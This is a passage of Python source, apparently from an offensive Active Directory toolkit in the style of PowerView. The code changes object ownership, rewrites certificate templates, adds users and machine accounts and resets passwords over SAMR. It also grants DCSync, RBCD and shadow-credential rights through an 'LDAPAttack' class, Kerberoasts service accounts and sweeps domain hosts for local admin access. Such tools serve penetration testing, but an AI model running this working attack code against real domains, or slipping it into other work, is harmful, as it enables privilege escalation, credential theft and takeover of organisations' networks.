        target_identity = self.get_domainobject(identity=targetidentity, properties=[
            'nTSecurityDescriptor',
            'sAMAccountname',
            'ObjectSID',
            'distinguishedName',
        ])
        if len(target_identity) > 1:
            logging.error("More than one target identity found")
            return
        elif len(target_identity) == 0:
            logging.error("Target identity not found in domain")
            return

        # verify that the principalidentity exists
        principal_identity = self.get_domainobject(identity=principalidentity)
        if len(principal_identity) > 1:
            logging.error("More than one principal identity found")
            return
        elif len(principal_identity) == 0:
            logging.error("Principal identity not found in domain")
            return

        # create changeowner object
        chown = ObjectOwner(target_identity[0])
        target_identity_owner = chown.read()

        if target_identity_owner == principal_identity[0]["attributes"]["objectSid"]:
            logging.info("%s is already the owner of the %s" % (principal_identity[0]["attributes"]["sAMAccountName"], target_identity[0]["attributes"]["distinguishedName"]))
            return

        logging.info("Changing current owner %s to %s" % (target_identity_owner, principal_identity[0]["attributes"]["objectSid"]))

        new_secdesc = chown.modify_securitydescriptor(principal_identity[0])

        succeeded = self.ldap_session.modify(
            target_identity[0]["attributes"]["distinguishedName"],
            {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [
                new_secdesc.getData()
            ])},
            controls=security_descriptor_control(sdflags=0x01)
        )

        if not succeeded:
            logging.error(self.ldap_session.result['message'])
        else:
            logging.info(f'Success! modified owner for {target_identity[0]["attributes"]["distinguishedName"]}')

        return succeeded
        return None

    def set_domaincatemplate(self, identity, args=None):
        if not args or not identity:
            logging.error("No identity or args supplied")
            return

        ca_fetch = CAEnum(self.ldap_session, self.root_dn)
        target_template = ca_fetch.get_certificate_templates(identity=identity, properties=['*'])
        if len(target_template) == 0:
            logging.error("No template found")
            return False
        elif len(target_template) > 1:
            logging.error('More than one template found')
            return False
        logging.info(f'Found template dn {target_template[0].entry_dn}')

        attr_key = ""
        attr_val = []

        if args.clear:
            attr_key = args.clear
        else:
            attrs = ini_to_dict(args.set) if args.set else ini_to_dict(args.append)

            if not attrs:
                logging.error(f"Parsing {'-Set' if args.set else '-Append'} value failed")
                return

            try:
                for val in attrs['value']:
                    try:
                        if val in target_template[0][attrs['attribute']]:
                            logging.error(f"Value {val} already set in the attribute "+attrs['attribute'])
                            return
                    except KeyError as e:
                        logging.debug("Attribute %s not found in template" % attrs['attribute'])
            except ldap3.core.exceptions.LDAPKeyError as e:
                logging.error(f"Key {attrs['attribute']} not found in template attribute. Adding anyway...")

            if args.append:
                temp_list = []
                if isinstance(target_template[0][attrs['attribute']].value, str):
                    temp_list.append(target_template[0][attrs['attribute']].value)
                elif isinstance(target_template[0][attrs['attribute']].value, int):
                    temp_list.append(target_template[0][attrs['attribute']].value)
                elif isinstance(target_template[0][attrs['attribute']].value, list):
                    temp_list = target_template[0][attrs['attribute']].value
                attrs['value'] = list(set(attrs['value'] + temp_list))
            elif args.set:
                attrs['value'] = list(set(attrs['value']))

            attr_key = attrs['attribute']
            attr_val = attrs['value']

        succeeded = self.ldap_session.modify(target_template[0].entry_dn, {
            attr_key:[
                (ldap3.MODIFY_REPLACE,attr_val)
            ]
        })

        if not succeeded:
            logging.error(self.ldap_session.result['message'])
        else:
            logging.info(f'Success! modified attribute for {identity} template')

        return succeeded

    def add_domaingroupmember(self, identity, members, args=None):
        group_entry = self.get_domaingroup(identity=identity,properties=['distinguishedName'])
        user_entry = self.get_domainobject(identity=members,properties=['distinguishedName'])
        if len(group_entry) == 0:
            logging.error(f'Group {identity} not found in domain')
            return
        if len(user_entry) == 0:
            logging.error(f'User {members} not found in domain. Try to use DN')
            return
        targetobject = group_entry[0]
        userobject = user_entry[0]
        if isinstance(targetobject["attributes"]["distinguishedName"], list):
            targetobject_dn = targetobject["attributes"]["distinguishedName"][0]
        else:
            targetobject_dn = targetobject["attributes"]["distinguishedName"]

        if isinstance(userobject["attributes"]["distinguishedName"], list):
            userobject_dn = userobject["attributes"]["distinguishedName"][0]
        else:
            userobject_dn = userobject["attributes"]["distinguishedName"]
        succeeded = self.ldap_session.modify(targetobject_dn,{'member': [(ldap3.MODIFY_ADD, [userobject_dn])]})
        if not succeeded:
            print(self.ldap_session.result['message'])
        return succeeded

    def remove_domaindnsrecord(self, identity=None, args=None):
        if args.zonename:
            zonename = args.zonename
        else:
            zonename = self.domain
            logging.debug("Using current domain %s as zone name" % self.domain)

        zones = [name['attributes']['name'] for name in self.get_domaindnszone(properties=['name'])]
        if zonename not in zones:
            logging.info("Zone %s not found" % zonename)
            return


        entry = self.get_domaindnsrecord(identity=identity, zonename=zonename)

        if len(entry) == 0:
            logging.info("No record found")
            return
        elif len(entry) > 1:
            logging.info("More than one record found")

        record_dn = entry[0]["attributes"]["distinguishedName"]

        succeeded = self.ldap_session.delete(record_dn)
        if not succeeded:
            logging.error(self.ldap_session.result['message'])
            return False
        else:
            logging.info("Success! Deleted the record")
            return True

    def remove_domaingroupmember(self, identity, members, args=None):
        group_entry = self.get_domaingroup(identity=identity,properties=['distinguishedName'])
        user_entry = self.get_domainobject(identity=members,properties=['distinguishedName'])
        if len(group_entry) == 0:
            logging.error(f'Group {identity} not found in domain')
            return
        if len(user_entry) == 0:
            logging.error(f'User {members} not found in domain, Try to use DN')
            return
        targetobject = group_entry[0]
        userobject = user_entry[0]
        if isinstance(targetobject["attributes"]["distinguishedName"], list):
            targetobject_dn = targetobject["attributes"]["distinguishedName"][0]
        else:
            targetobject_dn = targetobject["attributes"]["distinguishedName"]

        if isinstance(userobject["attributes"]["distinguishedName"], list):
            userobject_dn = userobject["attributes"]["distinguishedName"][0]
        else:
            userobject_dn = userobject["attributes"]["distinguishedName"]
        succeeded = self.ldap_session.modify(targetobject_dn,{'member': [(ldap3.MODIFY_DELETE, [userobject_dn])]})
        if not succeeded:
            print(self.ldap_session.result['message'])
        return succeeded

    def remove_domainuser(self, identity):
        if not identity:
            logging.error('Identity is required')
            return
        entries = self.get_domainuser(identity=identity)
        if len(entries) == 0:
            logging.error('Identity not found in domain')
            return
        identity_dn = entries[0]["attributes"]["distinguishedName"]
        au = ADUser(self.ldap_session, self.root_dn)
        au.removeUser(identity_dn)

    def add_domainuser(self, username, userpass, args=None):
        parent_dn_entries = f"CN=Users,{self.root_dn}"
        if args.basedn:
            entries = self.get_domainobject(identity=args.basedn)
            if len(entries) <= 0:
                logging.error(f"{args.basedn} could not be found in the domain")
                return
            parent_dn_entries = entries[0]["attributes"]["distinguishedName"]

        if len(parent_dn_entries) == 0:
            logging.error('Users parent DN not found in domain')
            return
        logging.debug(f"Adding user in {parent_dn_entries}")
        au = ADUser(self.ldap_session, self.root_dn, parent = parent_dn_entries)
        if au.addUser(username, userpass):
            return True
        else:
            return False

    def add_domainobjectacl(self, args):
        c = NTLMRelayxConfig()
        c.addcomputer = 'idk lol'
        c.target = self.dc_ip

        setattr(args, "delete", False)

        if '\\' not in args.principalidentity or '/' not in args.principalidentity:
            username = f'{self.domain}/{args.principalidentity}'
        else:
            username = args.principalidentity

        principal_entries = self.get_domainobject(identity=args.principalidentity, properties=['objectSid', 'distinguishedName'])
        if len(principal_entries) == 0:
            logging.error('[Add-DomainObjectAcl] Principal Identity object not found in domain')
            return
        if len(principal_entries) > 1:
            logging.error("[Add-DomainObjectAcl] More then one objects found")
        principalidentity_dn = principal_entries[0]["attributes"]["distinguishedName"]
        setattr(args,'principalidentity_dn', principalidentity_dn)
        if principalidentity_dn.upper().startswith("OU="):
            logging.info('Principal identity is an OU')
        else:
            principalidentity_sid = principal_entries[0]['attributes']['objectSid']
            setattr(args,'principalidentity_sid', principalidentity_sid)
        logging.info(f'Found principal identity dn {principalidentity_dn}')

        target_entries = self.get_domainobject(identity=args.targetidentity, properties=['objectSid', 'distinguishedName'])
        if len(target_entries) == 0:
            logging.error('Target Identity object not found in domain')
            return
        targetidentity_dn = target_entries[0]["attributes"]["distinguishedName"]
        setattr(args,'targetidentity_dn', targetidentity_dn)
        if targetidentity_dn.upper().startswith("OU="):
            logging.info('Target identity is an OU')
        else:
            targetidentity_sid = target_entries[0]['attributes']['objectSid']
            setattr(args,'targetidentity_sid', targetidentity_sid)
        logging.info(f'Found target identity dn {targetidentity_dn}')

        logging.info(f'Adding {args.rights} privilege to {args.targetidentity}')
        la = LDAPAttack(config=c, LDAPClient=self.ldap_session, username=username, root_dn=self.root_dn, args=args)
        if args.rights in ['all','dcsync','writemembers','resetpassword']:
            la.aclAttack()
        elif args.rights in ['rbcd']:
            la.delegateAttack()
        elif args.rights in ['shadowcred']:
            la.shadowCredentialsAttack()

    def remove_domainobjectacl(self, args):
        c = NTLMRelayxConfig()
        c.addcomputer = 'idk lol'
        c.target = self.dc_ip

        setattr(args, "delete", True)

        if '\\' not in args.principalidentity or '/' not in args.principalidentity:
            username = f'{self.domain}/{args.principalidentity}'
        else:
            username = args.principalidentity

        principal_entries = self.get_domainobject(identity=args.principalidentity)
        if len(principal_entries) == 0:
            logging.error('Principal Identity object not found in domain')
            return
        principalidentity_dn = principal_entries[0]['attributes']['distinguishedName']
        principalidentity_sid = principal_entries[0]['attributes']['objectSid']
        setattr(args,'principalidentity_dn', principalidentity_dn)
        setattr(args,'principalidentity_sid', principalidentity_sid)
        logging.info(f'Found principal identity dn {principalidentity_dn}')

        target_entries = self.get_domainobject(identity=args.targetidentity)
        if len(target_entries) == 0:
            logging.error('Target Identity object not found in domain')
            return
        targetidentity_dn = target_entries[0]['attributes']['distinguishedName']
        targetidentity_sid = target_entries[0]['attributes']['objectSid']
        setattr(args,'targetidentity_dn', targetidentity_dn)
        setattr(args,'targetidentity_sid', targetidentity_sid)
        logging.info(f'Found target identity dn {targetidentity_dn}')
        entries = self.get_domainobject(identity=args.principalidentity)
        if len(entries) == 0:
            logging.error('Target object not found in domain')
            return

        logging.info(f'Restoring {args.rights} privilege on {args.targetidentity}')
        la = LDAPAttack(config=c, LDAPClient=self.ldap_session, username=username, root_dn=self.root_dn, args=args)
        la.aclAttack()

    def remove_domaincomputer(self,computer_name):
        if computer_name[-1] != '$':
            computer_name += '$'

        dcinfo = get_dc_host(self.ldap_session, self.domain_dumper, self.args)
        if len(dcinfo)== 0:
            logging.error("Cannot get domain info")
            exit()
        c_key = 0
        dcs = list(dcinfo.keys())
        if len(dcs) > 1:
            logging.info('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
            cnt = 0
            for name in dcs:
                logging.info(f"{cnt}: {name}")
                cnt += 1
            while True:
                try:
                    c_key = int(input(">>> Your choice: "))
                    if c_key in range(len(dcs)):
                        break
                except Exception:
                    pass
        dc_host = dcs[c_key].lower()

        setattr(self.args, "dc_host", dc_host)
        setattr(self.args, "delete", True)

        if self.args.use_ldaps:
            setattr(self.args, "method", "LDAPS")
        else:
            setattr(self.args, "method", "SAMR")

        # Creating Machine Account
        addmachineaccount = ADDCOMPUTER(
            self.args.username,
            self.args.password,
            self.args.domain,
            self.args,
            computer_name)
        addmachineaccount.run()

        if len(self.get_domainobject(identity=computer_name)) == 0:
            return True
        else:
            return False

    def set_domaindnsrecord(self, args):
        if args.zonename:
            zonename = args.zonename
        else:
            zonename = self.domain

        zones = [name['attributes']['name'] for name in self.get_domaindnszone(properties=['name'])]
        if zonename not in zones:
            logging.info("Zone %s not found" % zonename)
            return

        recordname = args.recordname
        recordaddress = args.recordaddress

        entry = self.get_domaindnsrecord(identity=recordname, zonename=zonename, properties=['dnsRecord', 'distinguishedName', 'name'])

        if len(entry) == 0:
            logging.info("No record found")
            return
        elif len(entry) > 1:
            logging.info("More than one record found")
            return

        targetrecord = None
        records = []
        for record in entry[0]["attributes"]["dnsRecord"]:
            dr = DNS_RECORD(record)
            if dr["Type"] == 1:
                targetrecord = dr
            else:
                records.append(record)

        if not targetrecord:
            logging.error("No A record exists yet. Nothing to modify")
            return

        targetrecord["Serial"] = DNS_UTIL.get_next_serial(self.dc_ip, zonename, True)
        targetrecord['Data'] = DNS_RPC_RECORD_A()
        targetrecord['Data'].fromCanonical(recordaddress)
        records.append(targetrecord.getData())

        succeeded = self.ldap_session.modify(entry[0]['attributes']['distinguishedName'], {'dnsRecord': [(ldap3.MODIFY_REPLACE, records)]})

        if not succeeded:
            logging.error(self.ldap_session.result['message'])
            return False
        else:
            logging.info('Success! modified attribute for target record %s' % entry[0]['attributes']['distinguishedName'])
            return True

    def add_domaindnsrecord(self, args):
        if args.zonename:
            zonename = args.zonename
        else:
            zonename = self.domain
        recordname = args.recordname
        recordaddress = args.recordaddress

        zones = [name['attributes']['name'] for name in self.get_domaindnszone(properties=['name'])]
        if zonename not in zones:
            logging.info("Zone %s not found" % zonename)
            return

        if recordname.lower().endswith(zonename.lower()):
            recordname = recordname[:-(len(zonename)+1)]

        entries = self.get_domaindnsrecord(identity=recordname, zonename=zonename, properties=['dnsRecord','dNSTombstoned','name'])

        if entries:
            for e in entries:
                for record in e['attributes']['dnsRecord']:
                    dr = DNS_RECORD(record)
                    if dr['Type'] == 1:
                        address = DNS_RPC_RECORD_A(dr['Data'])
                        logging.info("Record %s in zone %s pointing to %s already exists" % (recordname, zonename, address.formatCanonical()))
                        return

        # addtype is A record = 1
        addtype = 1
        DNS_UTIL.get_next_serial(self.dc_ip, zonename, True)
        node_data = {
            # Schema is in the root domain (take if from schemaNamingContext to be sure)
            'objectCategory': 'CN=Dns-Node,CN=Schema,CN=Configuration,%s' % self.root_dn,
            'dNSTombstoned': False,
            'name': recordname
        }
        record = DNS_UTIL.new_record(addtype, DNS_UTIL.get_next_serial(self.dc_ip, zonename, True), recordaddress)
        search_base = f"DC={zonename},CN=MicrosoftDNS,DC=DomainDnsZones,{self.root_dn}"
        record_dn = 'DC=%s,%s' % (recordname, search_base)
        node_data['dnsRecord'] = [record.getData()]

        succeeded = self.ldap_session.add(record_dn, ['top', 'dnsNode'], node_data)
        if not succeeded:
            logging.error(self.ldap_session.result['message'])
            return False
        else:
            logging.info('Success! Created new record with dn %s' % record_dn)
            return True

    def add_domaincomputer(self, computer_name, computer_pass, args=None):
        if computer_name[-1] != '$':
            computer_name += '$'
        dcinfo = get_dc_host(self.ldap_session, self.domain_dumper, self.args)
        if len(dcinfo)== 0:
            logging.error("Cannot get domain info")
            exit()
        c_key = 0
        dcs = list(dcinfo.keys())
        if len(dcs) > 1:
            logging.info('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
            cnt = 0
            for name in dcs:
                logging.info(f"{cnt}: {name}")
                cnt += 1
            while True:
                try:
                    c_key = int(input(">>> Your choice: "))
                    if c_key in range(len(dcs)):
                        break
                except Exception:
                    pass
        dc_host = dcs[c_key].lower()

        setattr(self.args, "dc_host", dc_host)
        setattr(self.args, "delete", False)

        if self.use_ldaps:
            setattr(self.args, "method", "LDAPS")
        else:
            setattr(self.args, "method", "SAMR")

        # Creating Machine Account
        addmachineaccount = ADDCOMPUTER(
            self.username,
            self.password,
            self.domain,
            self.args,
            computer_name,
            computer_pass)
        addmachineaccount.run()

        if self.get_domainobject(identity=computer_name)[0]['attributes']['distinguishedName']:
            return True
        else:
            return False

    def get_namedpipes(self, args=None):
        host = ""
        is_fqdn = False
        host_inp = args.computer if args.computer else args.computername

        if host_inp:
            if not is_ipaddress(host_inp):
                is_fqdn = True
                if args.server and args.server.casefold() != self.domain.casefold():
                    if not host_inp.endswith(args.server):
                        host = f"{host_inp}.{args.server}"
                    else:
                        host = host_inp
                else:
                    if not is_valid_fqdn(host_inp):
                        host = f"{host_inp}.{self.domain}"
                    else:
                        host = host_inp
                logging.debug(f"Using FQDN: {host}")
            else:
                host = host_inp

        if self.use_kerberos:
            if is_ipaddress(args.computer) or is_ipaddress(args.computername):
                logging.error('FQDN must be used for kerberos authentication')
                return
            host = args.computer if args.computer else args.computername
        else:
            if is_fqdn:
                host = host2ip(host, self.dc_ip, 3, True)

        if not host:
            logging.error('Host not found')
            return

        available_pipes = []
        binding_params = {
            'lsarpc': {
                'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % host,
                'protocol': 'MS-EFSRPC',
                'description': 'Encrypting File System Remote (EFSRPC) Protocol',
            },
            'efsr': {
                'stringBinding': r'ncacn_np:%s[\PIPE\efsrpc]' % host,
                'protocol': 'MS-EFSR',
                'description': 'Encrypting File System Remote (EFSRPC) Protocol',
            },
            'samr': {
                'stringBinding': r'ncacn_np:%s[\PIPE\samr]' % host,
                'protocol': 'MS-SAMR',
                'description': 'Security Account Manager (SAM)',
            },
            'lsass': {
                'stringBinding': r'ncacn_np:%s[\PIPE\lsass]' % host,
                'protocol': 'N/A',
                'description': 'N/A',
            },
            'netlogon': {
                'stringBinding': r'ncacn_np:%s[\PIPE\netlogon]' % host,
                'protocol': 'MS-NRPC',
                'description': 'Netlogon Remote Protocol',
            },
            'spoolss': {
                'stringBinding': r'ncacn_np:%s[\PIPE\spoolss]' % host,
                'protocol': 'MS-RPRN',
                'description': 'Print System Remote Protocol',
            },
            'DAV RPC SERVICE': {
                'stringBinding': r'ncacn_np:%s[\PIPE\DAV RPC SERVICE]' % host,
                'protocol': 'WebClient',
                'description': 'WebDAV WebClient Service',
            },
            'netdfs': {
                'stringBinding': r'ncacn_np:%s[\PIPE\netdfs]' % host,
                'protocol': 'MS-DFSNM',
                'description': 'Distributed File System (DFS)',
            },
            'atsvc': {
                'stringBinding': r'ncacn_np:%s[\PIPE\atsvc]' % host,
                'protocol': 'ATSvc',
                'description': 'Microsoft AT-Scheduler Service',
            },
        }
        #self.rpc_conn = CONNECTION(self.args)
        if args.name:
            if args.name in list(binding_params.keys()):
                pipe = args.name
                if self.conn.connectRPCTransport(host, binding_params[pipe]['stringBinding'], auth=False):
                    #logging.info(f"Found named pipe: {args.name}")
                    pipe_attr = {'attributes': {'Name': pipe, 'Protocol':binding_params[pipe]['protocol'],'Description':binding_params[pipe]['description'],'Authenticated':f'{bcolors.WARNING}No{bcolors.ENDC}'}}
                    available_pipes.append(pipe_attr)
                elif self.conn.connectRPCTransport(host, binding_params[pipe]['stringBinding']):
                    pipe_attr = {'attributes': {'Name': pipe, 'Protocol':binding_params[pipe]['protocol'],'Description':binding_params[pipe]['description'],'Authenticated':f'{bcolors.OKGREEN}Yes{bcolors.ENDC}'}}
                    available_pipes.append(pipe_attr)
            else:
                logging.error(f"Invalid pipe name")
                return
        else:
            pipes = [ 'netdfs','netlogon', 'lsarpc', 'samr', 'browser', 'spoolss', 'atsvc', 'DAV RPC SERVICE', 'epmapper', 'eventlog', 'InitShutdown', 'keysvc', 'lsass', 'LSM_API_service', 'ntsvcs', 'plugplay', 'protected_storage', 'router', 'SapiServerPipeS-1-5-5-0-70123', 'scerpc', 'srvsvc', 'tapsrv', 'trkwks', 'W32TIME_ALT', 'wkssvc','PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER', 'db2remotecmd']
            for pipe in binding_params.keys():
                # TODO: Return entries
                pipe_attr = {}
                if self.conn.connectRPCTransport(host, binding_params[pipe]['stringBinding'], auth=False):
                    # logging.info(f"Found named pipe: {pipe}")
                    pipe_attr['attributes'] = {'Name':pipe, 'Protocol': binding_params[pipe]['protocol'], 'Description':binding_params[pipe]['description'], 'Authenticated': f'{bcolors.WARNING}No{bcolors.ENDC}'}
                    available_pipes.append(pipe_attr.copy())
                elif self.conn.connectRPCTransport(host, binding_params[pipe]['stringBinding']):
                    pipe_attr = {'attributes': {'Name': pipe, 'Protocol':binding_params[pipe]['protocol'],'Description':binding_params[pipe]['description'],'Authenticated':f'{bcolors.OKGREEN}Yes{bcolors.ENDC}'}}
                    available_pipes.append(pipe_attr.copy())
        return available_pipes

    def set_domainuserpassword(self, identity, accountpassword, oldpassword=None, args=None):
        entries = self.get_domainuser(identity=identity, properties=['distinguishedName','sAMAccountName'])
        if len(entries) == 0:
            logging.error(f'[Set-DomainUserPassword] No principal object found in domain')
            return
        elif len(entries) > 1:
            logging.error(f'[Set-DomainUserPassword] Multiple principal objects found in domain. Use specific identifier')
            return
        logging.info(f'[Set-DomainUserPassword] Principal {"".join(entries[0]["attributes"]["distinguishedName"])} found in domain')
        if self.use_ldaps:
            logging.debug("[Set-DomainUserPassword] Using LDAPS to change %s password" % (entries[0]["attributes"]["sAMAccountName"]))
            succeed = modifyPassword.ad_modify_password(self.ldap_session, entries[0]["attributes"]["distinguishedName"], accountpassword, old_password=oldpassword)
            if succeed:
                logging.info(f'[Set-DomainUserPassword] Password has been successfully changed for user {"".join(entries[0]["attributes"]["sAMAccountName"])}')
                return True
            else:
                logging.error(f'[Set-DomainUserPassword] Failed to change password for {"".join(entries[0]["attributes"]["sAMAccountName"])}')
                return False
        else:
            logging.debug("[Set-DomainUserPassword] Using SAMR to change %s password" % (entries[0]["attributes"]["sAMAccountName"]))
            try:
                #self.samr_conn = CONNECTION(self.args)
                #dce = self.samr_conn.init_samr_session()
                dce = self.conn.init_samr_session()
                if not dce:
                    logging.error('Error binding with SAMR')
                    return

                server_handle = samr.hSamrConnect(dce, self.dc_ip + '\x00')['ServerHandle']
                domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, self.domain)['DomainId']
                domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)['DomainHandle']
                userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (entries[0]['attributes']['sAMAccountName'],))['RelativeIds']['Element'][0]
                opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)

                req = samr.SamrSetInformationUser2()
                req['UserHandle'] = opened_user['UserHandle']
                req['UserInformationClass'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
                req['Buffer'] = samr.SAMPR_USER_INFO_BUFFER()
                req['Buffer']['tag'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
                req['Buffer']['Internal5']['UserPassword'] = cryptPassword(b'SystemLibraryDTC', accountpassword)
                req['Buffer']['Internal5']['PasswordExpired'] = 0

                resp = dce.request(req)
                logging.info(f'[Set-DomainUserPassword] Password has been successfully changed for user {"".join(entries[0]["attributes"]["sAMAccountName"])}')
                return True
            except:
                logging.error(f'[Set-DomainUserPassword] Failed to change password for {"".join(entries[0]["attributes"]["sAMAccountName"])}')
                return False

    def set_domaincomputerpassword(self, identity, accountpassword, oldpassword=None, args=None):
        entries = self.get_domaincomputer(identity=identity, properties=[
            'distinguishedName',
            'sAMAccountName',
        ])
        if len(entries) == 0:
            logging.error("[Get-DomainComputerPassword] Computer %s not found in domain" % (identity))
            return False
        elif len(entries) > 1:
            logging.error("[Get-DomainComputerPassword] Multiple computers found in domain")
            return False

        if self.use_ldaps:
            logging.debug("[Set-DomainComputerPassword] Using LDAPS to change %s password" % (entries[0]["attributes"]["sAMAccountName"]))
            succeed = modifyPassword.ad_modify_password(self.ldap_session, entries[0]["attributes"]["distinguishedName"], accountpassword, old_password=oldpassword)
            if succeed:
                logging.info(f'[Set-DomainComputerPassword] Password has been successfully changed for user {entries[0]["attributes"]["sAMAccountName"]}')
                return True
            else:
                logging.error(f'[Set-DomainComputerPassword] Failed to change password for {entries[0]["attributes"]["sAMAccountName"]}')
                return False
        else:
            logging.debug("[Set-DomainComputerPassword] Using SAMR to change %s password" % (entries[0]["attributes"]["sAMAccountName"]))
            try:
                dce = self.conn.init_samr_session()
                if not dce:
                    logging.error('Error binding with SAMR')
                    return

                server_handle = samr.hSamrConnect(dce, self.dc_ip + '\x00')['ServerHandle']
                domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, self.domain)['DomainId']
                domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)['DomainHandle']
                userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (entries[0]['attributes']['sAMAccountName'],))['RelativeIds']['Element'][0]
                opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)

                req = samr.SamrSetInformationUser2()
                req['UserHandle'] = opened_user['UserHandle']
                req['UserInformationClass'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
                req['Buffer'] = samr.SAMPR_USER_INFO_BUFFER()
                req['Buffer']['tag'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
                req['Buffer']['Internal5']['UserPassword'] = cryptPassword(b'SystemLibraryDTC', accountpassword)
                req['Buffer']['Internal5']['PasswordExpired'] = 0

                resp = dce.request(req)
                logging.info(f'[Set-DomainComputerPassword] Password has been successfully changed for user {"".join(entries[0]["attributes"]["sAMAccountName"])}')
                return True
            except:
                logging.error(f'[Set-DomainComputerPassword] Failed to change password for {"".join(entries[0]["attributes"]["sAMAccountName"])}')
                return False


    def set_domainobject(self,identity, args=None):
        targetobject = self.get_domainobject(identity=identity)
        if len(targetobject) > 1:
            logging.error('More than one object found')
            return False

        attr_key = ""
        attr_val = []

        if args.clear:
            attr_key = args.clear
        else:
            attrs = ini_to_dict(args.set) if args.set else ini_to_dict(args.append)

            if not attrs:
                logging.error(f"Parsing {'-Set' if args.set else '-Append'} value failed")
                return

            try:
                for val in attrs['value']:
                    try:
                        if val == targetobject[0]["attributes"][attrs['attribute']]:
                            logging.error(f"Value {val} already set in the attribute "+attrs['attribute'])
                            return
                    except KeyError as e:
                        logging.debug(f"Attribute {attrs['attribute']} not exists in object. Modifying anyway...")
            except ldap3.core.exceptions.LDAPKeyError as e:
                logging.error(f"Key {attrs['attribute']} not found in template attribute. Adding anyway...")

            if args.append:
                temp_list = []
                if isinstance(targetobject[0]["attributes"][attrs['attribute']], str):
                    temp_list.append(targetobject[0]["attributes"][attrs['attribute']])
                elif isinstance(targetobject[0]["attributes"][attrs['attribute']], int):
                    temp_list.append(targetobject[0]["attributes"][attrs['attribute']])
                elif isinstance(targetobject[0]["attributes"][attrs['attribute']], list):
                    temp_list = targetobject[0]["attributes"][attrs['attribute']]

                attrs['value'] = list(set(attrs['value'] + temp_list))
            elif args.set:
                attrs['value'] = list(set(attrs['value']))

            attr_key = attrs['attribute']
            attr_val = attrs['value']

        succeeded = self.ldap_session.modify(targetobject[0]["attributes"]["distinguishedName"], {
            attr_key:[
                (ldap3.MODIFY_REPLACE,attr_val)
            ]
        })

        if not succeeded:
            logging.error(self.ldap_session.result['message'])
        else:
            logging.info('Success! modified attribute for target object')

        return succeeded

    def invoke_kerberoast(self, args):
        # look for users with SPN set
        ldap_filter = ""
        ldap_filter = f"(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))"
        if args.identity:
            ldap_filter += f"(sAMAccountName={args.identity})"
        ldap_filter = f"(&{ldap_filter})"
        logging.debug(f'[Invoke-Kerberoast] LDAP Filter string: {ldap_filter}')
        self.ldap_session.search(self.root_dn, ldap_filter, attributes=['servicePrincipalName', 'sAMAccountName','pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'])
        entries = self.ldap_session.entries
        if len(entries) == 0:
            logging.debug("No identity found")
            return
        # request TGS for each accounts
        target_domain = self.domain

        if args.server:
            target_domain = args.server

        kdc_options = None
        enctype = None
        if args.opsec:
            enctype = 18 # aes
            kdc_options = "0x40810000"

        userspn = GetUserSPNs(self.username, self.password, self.domain, target_domain, self.args, identity=args.identity, options=kdc_options, encType=enctype)
        entries_out = userspn.run(entries)

        # properly formatted for output
        return entries_out

    def find_localadminaccess(self, args):
        host_entries = []
        hosts = {}

        computer = args.computer if args.computer else args.computername

        if not is_valid_fqdn(computer) and self.use_kerberos:
            logging.error('FQDN must be used for kerberos authentication')
            return

        if computer:
            if not is_valid_fqdn(computer):
                computer = "%s.%s" % (computer,self.domain)

            if is_ipaddress(computer):
                hosts['address'] = computer
            else:
                hosts['address'] = host2ip(computer, self.dc_ip, 3, True)
                hosts['hostname'] = computer
            host_entries.append(hosts)
        else:
            entries = self.get_domaincomputer(properties=['dnsHostName'])

            logging.info(f"Found {len(entries)} computers in the domain")
            if len(entries) > 100:
                logging.info("There are more than 100 computers in the domain. This might take some time")

            for entry in entries:
                try:
                    if len(entry['attributes']['dnsHostName']) <= 0:
                        continue

                    hosts['address'] = host2ip(entry['attributes']['dnsHostName'], self.dc_ip, 3, True)
                    hosts['hostname'] = entry['attributes']['dnsHostname']
                    host_entries.append(hosts.copy())
                except IndexError:
                    pass

        local_admin_pcs = []
        for ent in host_entries:
            pc_attr = {}

            if self.use_kerberos:
                smbconn = self.conn.init_smb_session(ent['hostname'])
            else:
                smbconn = self.conn.init_smb_session(ent['address'])

            try:
                smbconn.connectTree("C$")
                pc_attr['attributes'] = {'Name': ent['address'], 'Hostname': ent['hostname']}
                local_admin_pcs.append(pc_attr.copy())
            except:
                pass
        return local_admin_pcs

    def get_shares(self, args):
        is_fqdn = False
        host = ""
        host_inp = args.computer if args.computer else args.computername

        if host_inp:
            if not is_ipaddress(host_inp):
                is_fqdn = True
                if args.server and args.server.casefold() != self.domain.casefold():
                    if not host_inp.endswith(args.server):
                        host = f"{host_inp}.{args.server}"
                    else:
                        host = host_inp
                else:
                    if not is_valid_fqdn(host_inp):
                        host = f"{host_inp}.{self.domain}"
                    else:
                        host = host_inp
                logging.debug(f"Using FQDN: {host}")
            else:
                host = host_inp

        if self.use_kerberos:
            if is_ipaddress(args.computer) or is_ipaddress(args.computername):
                logging.error('FQDN must be used for kerberos authentication')
                return
            host = args.computer if args.computer else args.computername
        else:
            if is_fqdn:
                host = host2ip(host, self.dc_ip, 3, True)

        if not host:
            logging.error(f"Host not found")
            return

        if self.use_kerberos:
            client = self.conn.init_smb_session(host)
        else:
            client = self.conn.init_smb_session(host)

        if not client:
            return

        shares = client.listShares()
        share_infos = []

        print(f'{"Name".ljust(15)}{"Remark".ljust(25)}Address')
        print(f'{"----".ljust(15)}{"-------".ljust(25)}------------')
        for i in range(len(shares)):
            share_name = shares[i]['shi1_netname'][:-1]
            share_remark = shares[i]['shi1_remark'][:-1]
            share_info = {'name': share_name, 'remark': share_remark}
            share_infos.append(share_info)

            print(f'{share_info["name"].ljust(15)}{share_info["remark"].ljust(25)}{host}')
        print()
